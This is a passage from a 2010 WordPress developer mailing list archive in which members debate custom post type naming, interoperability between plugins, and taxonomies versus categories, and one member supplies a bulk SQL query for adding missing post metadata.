). I'm not sure if SuperSoap is a "book", but I do have it in my (book) 
library, not my DVD library. (BTW, in my DVD library I've some digitized 
comic-books...)

My approach (and I suppose someone else will have done something like 
that) is using "term groups"; not the ones in the wp_terms table, but 
"glossaries" (groups of semantically-related terms) which can be 
children or parent of any number of other term groups/glossaries 
("cities" are a subgroup of "places", as "planets" are). So I have the 
potential of grouping that taxonomies have (to make, say, tag clouds for 
some glossary cats).

I'm using a custom wp_termmeta table for this (and many other things), 
but this can be done with regular wp_options. The glossaries are stored 
taxonomies-like (a global array). Hook to edit tag form, add the field. 
Easily done, too. Want the nice permalinks? Filter the category link, 
and move it to a Page: category.php can double as Page template with 
little effort (yes, the Page ID is another term meta... which can be a 
single option row, too). Using the conditional tags, read the term_id 
either from queryvar or a postmeta field: voil?!, prettiest permalinks 
ever. Meta boxes? Not that hard, neither.

Want to find all your copies of ShakeSpeare's Sonnets? Just do it with 
category__in, category__and, &c. You'll be adding just an instance of 
the term-taxonomy table. No matter how many additional "glossaries" 
you're asking for, it's just the regular query/get_posts, and reading an 
array: scales nicely, uses the API.

All of this could be done even with good ol' 2.9.x version (and surely 
earlier, but I'm relatively new at this). So, nothing really new here, 
save maybe the implementation.

And well, maybe you don't need to know where in your library is your 
copy of Shakespeare's Sonnets in Penguin edition: by this I mean that, 
yes, in some cases, using post types and taxonomies can be the best way. 
But I'm pretty sure the estate folks will like to know how many 
two-story buildings with garden and two bathrooms are availabe in the 
SpringField area in the price range of US$ whatever. Or, also, do 
something like the Codex: is it better to add the post_types of 
description, return value, usage, examples, version since, see also, 
related, &c, and query them... or just add some categories (of the 
'wp_content_type' "glossary") and do a rewind_posts? If you add the evil 
option page to allow the user to specify which category is to be used as 
what ("this is description, this is return value..."), you won't have 
any of the compatibility among post_type "description", "usage" issues. 
Problem solved: if it doesn't work, it's user's fault :D, not plug-in's 
nor core's.

Anyway, though, as I said (didn't I explicit that already? my fault), 
it's true that custom post types do add LOTS of potential. But I'm 
thinking more about, say, Flash game wrappers that add highscores and 
game data as postmeta, private messaging for users, or using the "link" 
post type and being able to use your "regular" terms for links too. But 
adding all that API just to automatically add some custom fields and 
nothing (or little) more is IMHO a bad idea, at least until you can use 
term__in, term__and, term__not_in &c with the same nice scalability that 
using only "regular" terms have. So, yes, IMHO there are some doors 
that've been opened with all the new 3.0 stuff (half-opened earlier); 
just not those of library management, but for RPGs & a whole bunch of 
other interesting things.

Best,

Xavier

From wp at andrewnacin.com  Mon Jul 12 20:31:29 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 12 Jul 2010 16:31:29 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk> 
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net> 
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com> 
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
Message-ID: <AANLkTik1jeBwJP85VYkrJRHh9xDBVd4o5CbwE46KTcLD@mail.gmail.com>

On Mon, Jul 12, 2010 at 4:24 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

> I've read through the whole thread and he are my comments.
>
> Personally I would recommend against people "reserving" post types - you
> are creating mines in which your data will be stored which won't make it
> easy for other plugins or themes to interact with without breaking arbitrary
> rules:
>
> "like custom post types must be prefixed in a plugin specific way"
>
> I would rather recommend that if you are creating a plugin which allows
> people to create "Events" you use a post type called "event" and you write
> your code in such a way that if some special piece of post_meta you need is
> missing you have a default for it which you use.
>
> That way when I decide to switch from your Events plugin to this new kid on
> the block I can still manage and use all those events I already created
> using the new plugin.
>
> Basically a plugin using Custom Post Types should follow Postel's Law:
>
> "be conservative in what you do, be liberal in what you accept from others"
>
> I think that it is better for the community and the users in general if it
> is easy for people to switch between plugins which compete in the same space
> rather than difficult because they have stored the data slightly differently
> after all this is why we have custom post types instead of each plugin
> creating it's own tables.
>

To take what Peter said a little further, just some additional food for
thought:

I don't want my products/books/events to be wiped on an uninstall hook, as I
worked hard to cultivate that data.

From mikeschinkel at newclarity.net  Mon Jul 12 21:31:26 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 17:31:26 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
Message-ID: <C7EF39F4-7F18-4036-8FD6-54412344B838@newclarity.net>

On Jul 12, 2010, at 4:24 PM, Peter Westwood wrote:
> Personally I would recommend against people "reserving" post types - you are creating mines in which your data will be stored which won't make it easy for other plugins or themes to interact with without breaking arbitrary rules:

I'm not 100% clear what you mean when you say "reserving" post types.  Do you mean creating a namespaced post type?

> I would rather recommend that if you are creating a plugin which allows people to create "Events" you use a post type called "event" and you write your code in such a way that if some special piece of post_meta you need is missing you have a default for it which you use.
> 
> That way when I decide to switch from your Events plugin to this new kid on the block I can still manage and use all those events I already created using the new plugin.

On Jul 12, 2010, at 4:31 PM, Andrew Nacin wrote:
> I don't want my products/books/events to be wiped on an uninstall hook, as I
> worked hard to cultivate that data.

Agreed in theory.  

I fear in practice we are likely to find people will get to "keep" their event posts but none of the meta will line up.  So in essence these "kept" posts will be orphans in limbo until someone edits each and every one. (Sure most anyone on this list can run SQL queries to clean it up, but our collective SQL skills are <1% of the user base.)

We'll never "solve" this problem completely and I'm not suggesting we can.  But we might handle a useful percentage if we have a well-known place where people who are interested in "Event" post type can collaborate on ensuring compatibilities for the naming that most everyone needs.  Not proposing any "requirements" here, just a forum for discussion and a place to write down the current state of agreement. (That's why I suggested me updating the codex in that regard but am waiting for some feedback before I steam ahead.)

On Jul 12, 2010, at 4:24 PM, Peter Westwood wrote:
> Basically a plugin using Custom Post Types should follow Postel's Law: 
> 
> "be conservative in what you do, be liberal in what you accept from others"

Big fan of Postel's Law. But in the context  there are just some basic fundamentals that must to be coordinated to ensure interoperability. For example in Postel's world: HTTP status codes, standard HTTP Headers (vs. "x-" headers), standard content types (vs. "x-" content types), schemes (i.e. "http", "https", "ftp", etc.) and so on.  A well-known place to discuss and docuement "fundamentals" for post types, minimally a core defined set of custom field names and behaviors, would be helpful IMO.


On Jul 12, 2010, at 4:28 PM, The WordPress Web Warlock wrote:
> And even then, some standards can have many different implementations, so it's hard to stick just to one. How do we do ratings? Unless you store score AND scale, the "five-star-scale" and the "0 to 10 scale" can be pretty incompatible. (If you add score and scale, though, you can even compare ratings in different scales; just store the rating in a common scale, say 0 to 1, and convert it for display).

That argument can be made for practically every standard or potential standard in human history. Rather than give into the urge to believe it can't be done, I ask can we think in terms of the subsets for which it can be done.

The original HTML was successful (IMO) not because it was perfect but because it provided significant usability while putting a stake in the ground around which everyone could operate. From there improvements were made.  So (IMO again) address the common subset most reasonable people can agree on is a much better starting point than just chaos.  Or let one proactive person propose a standard and if it is good enough to gain adoption, work from there.

One thing is a problem, and that's over-architecture.  There can be multiple "standards" to address different use-cases.

> So, I'd leave it as "if there's a standard of any kind, use it, dangit!"
>> (...) With custom post types and taxonomies, we have really opened up the types of web-apps for which WordPress can be the backbone.
> I disagree with that, but not entirely. There are lots of things that have been mentioned as "now we can" with post types that, from my experience, are best done with regular categories and posts. Books are quite an example, as real estate and movies, at least until some major enhancements are done to taxonomies/WP_Query.

> 

> I'll put you an example with books. Suppose we're to add ShakeSpeare's Sonnets: we'd have the "book" post type, the "genre" taxonomy, some "publisher" and maybe "collection" taxonomies.
> 
> AFAIK, it's a real mess to query althogether for genre=poetry AND author=william-shakespeare AND post_type=book. Last time I worked on it, the query var for taxonomies was just a rewrite for taxonomy and term. And adding another taxonomy query (say, "publisher" or "collection") meant adding another instance of the taxonomies table. So I went for another, more scalable and API-using approach instead.

That's off-topic, but not using CPTs because of lack of built-in query functionality is throwing the baby out with the bathwater.  I've had no real problems with this.  Yes, I've had to use hooks but I plan to propose the code be added to WP core when I get time to package it all up.

> Also, taxonomies are not hierarchical (and by this I mean "taxonomies cannot be children/parent of other taxonomies", I'm not talking about taxonomy *terms*). Categories (or terms for a hierarchical taxonomy) are. You can list both your books, magazines, comic books, fanzines and AD&D boxes all together, or separately, as you need to. Hey, I worked for a roleplaying publisher that issued a box with the books, a T-shirt and a character miniature... And a post can belong to *many* "content_type" categories, but can be of only one post_type. So, SuperSoaps INC. could be listed as being a book, and a bundle, and a T-shirt, and having goodies, and miniature. (Well, the game was actually called "SuperHeroes INC.", but it got the soap nickname... guess why :) ). I'm not sure if SuperSoap is a "book", but I do have it in my (book) library, not my DVD library. (BTW, in my DVD library I've some digitized comic-books...)

That's because you are thinking about CPTs too granularly (IMO.)  What you have is not a Book, it's a Product (or "Saleable Item.") But it's not a Post and keeping it as a post will hoist all those same limitations on you.

> My approach is...

Your explanation has gotten too complicated for me to follow. Without seeing what you've done it's really hard to tell if it's overkill or the best approach. (I'm not soliciting you to send me your stuff, but making a rhetorical statement.)  Anyway, point is you may have something that is simply too custom for your needs to be appropriate for shared post type definition.  Or if not, then having many heads design it would be preferable to having one.

> But I'm pretty sure the estate folks will like to know how many two-story buildings with garden and two bathrooms are availabe in the SpringField area in the price range of US$ whatever.

This can totally be done with CPTs and CTs.  I'm doing similar on three projects and it is working swimmingly.

> Or, also, do something like the Codex: is it better to add the post_types of description, return value, usage, examples, version since, see also, related, &c, and query them... or just add some categories (of the 'wp_content_type' "glossary") and do a rewind_posts? If you add the evil option page to allow the user to specify which category is to be used as what ("this is description, this is return value..."), you won't have any of the compatibility among post_type "description", "usage" issues. Problem solved: if it doesn't work, it's user's fault :D, not plug-in's nor core's.
> 
> Anyway, though, as I said (didn't I explicit that already? my fault), it's true that custom post types do add LOTS of potential. But I'm thinking more about, say, Flash game wrappers that add highscores and game data as postmeta, private messaging for users, or using the "link" post type and being able to use your "regular" terms for links too. But adding all that API just to automatically add some custom fields and nothing (or little) more is IMHO a bad idea, at least until you can use term__in, term__and, term__not_in &c with the same nice scalability that using only "regular" terms have. So, yes, IMHO there are some doors that've been opened with all the new 3.0 stuff (half-opened earlier); just not those of library management, but for RPGs & a whole bunch of other interesting things.

CPTs are not as "comfortable" as the older ways yet because we haven't figured out all the related design patterns. 
CPTs are new and the supporting infrastructure for them has not been as fleshed out as the older systems. A good PHP/MySQL dev can get around those issues, and ultimately contribute their solutions to core or as plugins. That doesn't make the older systems better in all cases, just means that time will improve CPTs as time improved what came before it.

One final point, CPTs are not-panacea, but they are immensely useful. To repeat Michael "With custom post types and taxonomies, we have really opened up the types of web-apps for which WordPress can be the backbone."

-Mike

From 24-7 at gmx.net  Mon Jul 12 22:21:01 2010
From: 24-7 at gmx.net (24/7)
Date: Mon, 12 Jul 2010 15:21:01 -0700 (PDT)
Subject: [wp-hackers] general: core-plugins and options,
	-naming & codex-ui-docs
Message-ID: <c6f61791-ad20-4f72-a19a-5fe2dd186a52@w12g2000yqj.googlegroups.com>

Hi list,

i was away for some days and just read through the different topics
currently beeing discussed.
With having an eye on the community focus in this period i took a
first look at my support history
in the de-forum to address some of the most basic problems wp-
beginners (which are the largest
part of all wp-users/-blog owners). Please note, that i (and most of
you) know that some things
can't be changed and therefore not meant to be a discussion starting
point or some sort of core-critics or else.
Some of the text below could be dropped into the discussions from this
weekend, but i don't want to drop
in five mails and fill your mailboxes, so i sum it up.

Core Naming) Collisions are likely to happen to people who a) have
learnt them selve how to code b) don't know how
to code or c) don't know the core inside out. Those collisions doesn't
only happen with functions, but with globals
too. Due to the fact that core-devs and the surrounding hardcore super-
professional (and small) community have
the deepest knowledge of code and core-code, it would make the live of
plugin-devs, theme-devs and blog owners
who want to modify their themes (everybody wants it and starts there -
fun that this nearly never happens to the
holy plugins) much easier if core would respect that fact and have a
pretty strict naming conventions. The
second benefit would be that most of the mentioned above people would
see at a first look, without really knowing
what they are doing, that this or that is something that belongs to
the core.

Core Plugins and Options) A lot of the issues people have can simply
be solved with things like "Go there and click that
checkbox". Others (more than the first group) can be solved with
"write the following into your functions.php"
and "no it doesn't matter where exactly". With the note from Andrew
Nacin in my mind "bundle" (if i understood
that right): Maybe it would make sense to a) collect the most common
support request and make them avaible as
option or extend those options b) "bundle" "core plugins" into the
most commonly needed packages and make these
setups avaible and c) maybe group them into basic/intermediate/
advanced options.

Codex UI Docs) This is the smallest thing: An extremly good starting
point to wordpress is step 4 from the Codex
"New to Wordpress - Where to start". Maybe this could be mor prominent
and on the index page of wordpress.org.
Maybe it would some of the most basic questions.

As i said: if you did understand something in the text written above
as offensive against you or wp, please
don't see it that way. If you give support in the wp.org or in some
other (or lang-specific) forum or similar
and got some time left to read through your history in the next week:
I'll try to sum up mine and hope some
people jump in to get a list of basic needs and gaps that could get
filled. Wordpress lives from the masses
of "just users". I think we should take some time and invest some
efforts in making their lives easier.

Thanks for reading.

-K.

From elfin at elfden.co.uk  Mon Jul 12 22:24:49 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Mon, 12 Jul 2010 23:24:49 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>
	<4C3B0CF7.2000309@voceconnect.com>	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
Message-ID: <4C3B9631.2090205@elfden.co.uk>

On 12/07/2010 21:24, Peter Westwood wrote:
> I've read through the whole thread and he are my comments.
>
> Personally I would recommend against people "reserving" post types
> - you are creating mines in which your data will be stored which
> won't make it easy for other plugins or themes to interact with
> without breaking arbitrary rules:
>
> "like custom post types must be prefixed in a plugin specific way"
>
> I would rather recommend that if you are creating a plugin which
> allows people to create "Events" you use a post type called "event"
> and you write your code in such a way that if some special piece of
> post_meta you need is missing you have a default for it which you
> use.
>
> That way when I decide to switch from your Events plugin to this
> new kid on the block I can still manage and use all those events I
> already created using the new plugin.

I cringe whenever I read people saying this. Maybe my thinking is 
wonky on this issue, but surely different plugins will have different 
ideas on how to use things. Example: 2 plugins each using 'event' as 
their custom post type.
plugin one uses start_date & end_date
plugin two uses startdate & enddate

(and yes I'm thinking specifically of post meta here).

You stop using plugin one and go to plugin two - but you will 
potentially lose any extra data stored. The only commonality is the 
post type name - every thing else is potentially different.

Yes the post itself remains, but all the extras won't. I'm not sure I 
see the benefit of actually using the same custom post type.

So am I missing something here?

Rich

From CaptainN at unFocus.com  Mon Jul 12 22:56:32 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 12 Jul 2010 18:56:32 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
Message-ID: <4C3B9DA0.5070805@unFocus.com>

  On 7/10/10 4:05 PM, Otto wrote:
> One would hope that plugins would use a prefix naming convention for
> their custom types in the same way we recommend making function names
> and such. plugin_whatever and so forth.
Interesting idea. There is built in support for minimizing all that 
prefix typing when it comes to using classes in plugin development - 
something like this routine: add_action('init', array(&$this, 'init'));

Perhaps something similar could be added to register_post_type to 
provide a way to auto-prefix post type names. Since it seems there are 
other ways to modify the public representations of these names, why not 
make collisions at least a little less likely to occur.

In the mean time, if plugin devs want to take a auto-disciplined 
approach, they could prefix thusly: register_post_type(__class__ . 
'_your_custom_post_type_id').

Kevin N.



From matt at mattjacob.com  Mon Jul 12 22:57:11 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Mon, 12 Jul 2010 15:57:11 -0700
Subject: [wp-hackers] Best way to kick off actual work from plugin
 settings page?
In-Reply-To: <20100712081854.GF1955@waugh.id.au>
References: <4C3ABE81.9040202@mattjacob.com>	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>	<4C3AC3E0.8090801@mattjacob.com>
	<20100712081854.GF1955@waugh.id.au>
Message-ID: <4C3B9DC7.6060705@mattjacob.com>

On 7/12/10 1:18 AM, Jeff Waugh wrote:
> A delightful way to approach this might involve wp_schedule_single_event.

I like the idea, but I think it's more work than what's necessary for my 
specific application. I'm basically doing an INSERT ... SELECT for what 
I assume will be, at most, 1500 rows. It should be a fairly quick operation.

Matt

From CaptainN at unFocus.com  Mon Jul 12 23:02:58 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 12 Jul 2010 19:02:58 -0400
Subject: [wp-hackers] Extending Custom Post Types
Message-ID: <4C3B9F22.2070100@unFocus.com>

  Hi there,

I'm looking for some pointers on extending the dataset that goes along 
with a custom post type. I'd like to be able to store data like a list 
of amenities for a business listing, map coordinates, granular address 
information, etc., and then query and sort on that data, in non-static 
query pages (sort on the "zip" column, or return only "business" post 
types with swimming pool amenities, for example).

Is there a way to do that using the built in Custom Post types alone 
(some of this could be done with tag like taxonomy, but other bits, like 
location or address data might not be suitable), or should I add a 
custom MySQL table to retrieve, sort and group query results on extended 
data? If I use a custom table, anyone have an example to get me in quicker?

Pointers on adding the actual form fields to the edit/new custom post 
type pages in the admin would be helpful too (I'm pretty much starting 
from start here).

Thanks,

Kevin N.


From mikeschinkel at newclarity.net  Mon Jul 12 23:06:35 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 19:06:35 -0400
Subject: [wp-hackers] Extending Custom Post Types
In-Reply-To: <4C3B9F22.2070100@unFocus.com>
References: <4C3B9F22.2070100@unFocus.com>
Message-ID: <FB2A76D1-E6BA-44B8-894A-89D6B5E5A8F0@newclarity.net>

Custom fields vs. custom tables whenever possible.  Give us some more specifics of what you are trying to do but are struggling with when using custom post types and we'll do our best to help out.

-Mike

On Jul 12, 2010, at 7:02 PM, Kevin Newman wrote:

> Hi there,
> 
> I'm looking for some pointers on extending the dataset that goes along with a custom post type. I'd like to be able to store data like a list of amenities for a business listing, map coordinates, granular address information, etc., and then query and sort on that data, in non-static query pages (sort on the "zip" column, or return only "business" post types with swimming pool amenities, for example).
> 
> Is there a way to do that using the built in Custom Post types alone (some of this could be done with tag like taxonomy, but other bits, like location or address data might not be suitable), or should I add a custom MySQL table to retrieve, sort and group query results on extended data? If I use a custom table, anyone have an example to get me in quicker?
> 
> Pointers on adding the actual form fields to the edit/new custom post type pages in the admin would be helpful too (I'm pretty much starting from start here).
> 
> Thanks,
> 
> Kevin N.
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joelfisher at gmail.com  Mon Jul 12 23:08:18 2010
From: joelfisher at gmail.com (Joel Fisher)
Date: Mon, 12 Jul 2010 19:08:18 -0400
Subject: [wp-hackers] MySQL queries to add to wp_postmeta
Message-ID: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>

I have a ton of posts that I need to add a meta_key and meta_value too.
Some posts, it already exists so I don't want to overwrite.

Basically I want to add it to ALL posts that do NOT have it already.

Can someone point me to a MySQL query or alternative method to add this data?

Thanks.



joel.fisher
www.flushinc.com

Linkedin: http://www.linkedin.com/in/jfisher
Follow: www.twitter.com/joelmoney

From wp at andrewnacin.com  Mon Jul 12 23:11:20 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 12 Jul 2010 19:11:20 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3B9DA0.5070805@unFocus.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<4C3B9DA0.5070805@unFocus.com>
Message-ID: <AANLkTinlvq4i3IWI3tEb6eht28SQDvFFIJ1f5B7GB4JG@mail.gmail.com>

On Mon, Jul 12, 2010 at 6:56 PM, Kevin Newman <CaptainN at unfocus.com> wrote:

> In the mean time, if plugin devs want to take a auto-disciplined approach,
> they could prefix thusly: register_post_type(__class__ .
> '_your_custom_post_type_id').
>

The names of post types are limited to 20 characters in the DB. That is
guaranteed to be silently trimmed.

From mikeschinkel at newclarity.net  Mon Jul 12 23:12:25 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 19:12:25 -0400
Subject: [wp-hackers] MySQL queries to add to wp_postmeta
In-Reply-To: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>
References: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>
Message-ID: <F1B38340-2F81-4CB3-A941-4B397ADF9FBE@newclarity.net>

How are you going to generate the queries?  In an Excel spreadsheet and run them all, or by calling a function that issues the SQL, or something else.  IOW, where is your metadata coming from?

-Mike

On Jul 12, 2010, at 7:08 PM, Joel Fisher wrote:

> I have a ton of posts that I need to add a meta_key and meta_value too.
> Some posts, it already exists so I don't want to overwrite.
> 
> Basically I want to add it to ALL posts that do NOT have it already.
> 
> Can someone point me to a MySQL query or alternative method to add this data?
> 
> Thanks.
> 
> 
> 
> joel.fisher
> www.flushinc.com
> 
> Linkedin: http://www.linkedin.com/in/jfisher
> Follow: www.twitter.com/joelmoney
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joelfisher at gmail.com  Mon Jul 12 23:14:14 2010
From: joelfisher at gmail.com (Joel Fisher)
Date: Mon, 12 Jul 2010 19:14:14 -0400
Subject: [wp-hackers] MySQL queries to add to wp_postmeta
In-Reply-To: <F1B38340-2F81-4CB3-A941-4B397ADF9FBE@newclarity.net>
References: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>
	<F1B38340-2F81-4CB3-A941-4B397ADF9FBE@newclarity.net>
Message-ID: <AANLkTik82Oz_0Xj5ZLi_TzNG7idoIQDObMJxXaAWENm5@mail.gmail.com>

Basically it is just a custom field.

I want every post that currently does NOT have the meta_key = members
to get it and also set the meta_value = false.

Does that make sense?

So, it is the same key and the same value for all posts that does not
currently have it set.


joel.fisher
www.flushinc.com

Linkedin: http://www.linkedin.com/in/jfisher
Follow: www.twitter.com/joelmoney




On Mon, Jul 12, 2010 at 7:12 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> How are you going to generate the queries? ?In an Excel spreadsheet and run them all, or by calling a function that issues the SQL, or something else. ?IOW, where is your metadata coming from?
>
> -Mike
>
> On Jul 12, 2010, at 7:08 PM, Joel Fisher wrote:
>
>> I have a ton of posts that I need to add a meta_key and meta_value too.
>> Some posts, it already exists so I don't want to overwrite.
>>
>> Basically I want to add it to ALL posts that do NOT have it already.
>>
>> Can someone point me to a MySQL query or alternative method to add this data?
>>
>> Thanks.
>>
>>
>>
>> joel.fisher
>> www.flushinc.com
>>
>> Linkedin: http://www.linkedin.com/in/jfisher
>> Follow: www.twitter.com/joelmoney
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Mon Jul 12 23:26:18 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 19:26:18 -0400
Subject: [wp-hackers] MySQL queries to add to wp_postmeta
In-Reply-To: <AANLkTik82Oz_0Xj5ZLi_TzNG7idoIQDObMJxXaAWENm5@mail.gmail.com>
References: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>
	<F1B38340-2F81-4CB3-A941-4B397ADF9FBE@newclarity.net>
	<AANLkTik82Oz_0Xj5ZLi_TzNG7idoIQDObMJxXaAWENm5@mail.gmail.com>
Message-ID: <03721907-D05C-411C-BF6D-452090EED81C@newclarity.net>

So you want a bulk insert statement to add the meta_key with a default value for every one that's missing one?  Why not default the value in PHP code rather than take up disk space?

That said, I think this is what you asked for, let me know if not:

==========
INSERT INTO wp_postmeta2 (post_id,meta_key,meta_value)
SELECT ID,'my_custom_key','false' 
FROM wp_posts 
WHERE ID NOT IN (SELECT post_id FROM wp_postmeta2 WHERE meta_key = 'my_custom_key')
==========

P.S. This can be written several ways, I wrote this to try to make it the most obvious.

-Mike


On Jul 12, 2010, at 7:14 PM, Joel Fisher wrote:

> Basically it is just a custom field.
> 
> I want every post that currently does NOT have the meta_key = members
> to get it and also set the meta_value = false.
> 
> Does that make sense?
> 
> So, it is the same key and the same value for all posts that does not
> currently have it set.
> 
> 
> joel.fisher
> www.flushinc.com
> 
> Linkedin: http://www.linkedin.com/in/jfisher
> Follow: www.twitter.com/joelmoney
> 
> 
> 
> 
> On Mon, Jul 12, 2010 at 7:12 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> How are you going to generate the queries?  In an Excel spreadsheet and run them all, or by calling a function that issues the SQL, or something else.  IOW, where is your metadata coming from?
>> 
>> -Mike
>> 
>> On Jul 12, 2010, at 7:08 PM, Joel Fisher wrote:
>> 
>>> I have a ton of posts that I need to add a meta_key and meta_value too.
>>> Some posts, it already exists so I don't want to overwrite.
>>> 
>>> Basically I want to add it to ALL posts that do NOT have it already.
>>> 
>>> Can someone point me to a MySQL query or alternative method to add this data?
>>> 
>>> Thanks.
>>> 
>>> 
>>> 
>>> joel.fisher
>>> www.flushinc.com
>>> 
>>> Linkedin: http://www.linkedin.com/in/jfisher
>>> Follow: www.twitter.com/joelmoney
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From CaptainN at unFocus.com  Mon Jul 12 23:31:28 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 12 Jul 2010 19:31:28 -0400
Subject: [wp-hackers] Extending Custom Post Types
In-Reply-To: <FB2A76D1-E6BA-44B8-894A-89D6B5E5A8F0@newclarity.net>
References: <4C3B9F22.2070100@unFocus.com>
	<FB2A76D1-E6BA-44B8-894A-89D6B5E5A8F0@newclarity.net>
Message-ID: <4C3BA5D0.8050303@unFocus.com>

  I'm still in the investigation phase, trying to figure out the best 
approach. I'm making a business listing plugin, and I'll need to be able 
to associate a bunch of data with it - like a bunch of booleans (pool, 
tenis courts, etc.), address info, membership info, etc. - all of it 
needs to be searchable and sortable (ORDER in SQL parlance) - searchable 
at least.

It'll be replacing an older asp.net application - interestingly, what we 
ended up doing there for searching, was dumping a copy of every 
attribute into a blob field, and using a fulltext index to pull out 
ranked searches. Pretty spiffy really.

If I come up with anything specific to ask I'll go ahead and do that.

Thanks,

Kevin N.


On 7/12/10 7:06 PM, Mike Schinkel wrote:
> Custom fields vs. custom tables whenever possible.  Give us some more specifics of what you are trying to do but are struggling with when using custom post types and we'll do our best to help out.
>

From mikeschinkel at newclarity.net  Mon Jul 12 23:32:03 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 19:32:03 -0400
Subject: [wp-hackers] MySQL queries to add to wp_postmeta
In-Reply-To: <03721907-D05C-411C-BF6D-452090EED81C@newclarity.net>
References: <AANLkTimZ7Rh8d_Uom2WtBnejkzmIMBSv_IIpQoc9ReHa@mail.gmail.com>
	<F1B38340-2F81-4CB3-A941-4B397ADF9FBE@newclarity.net>
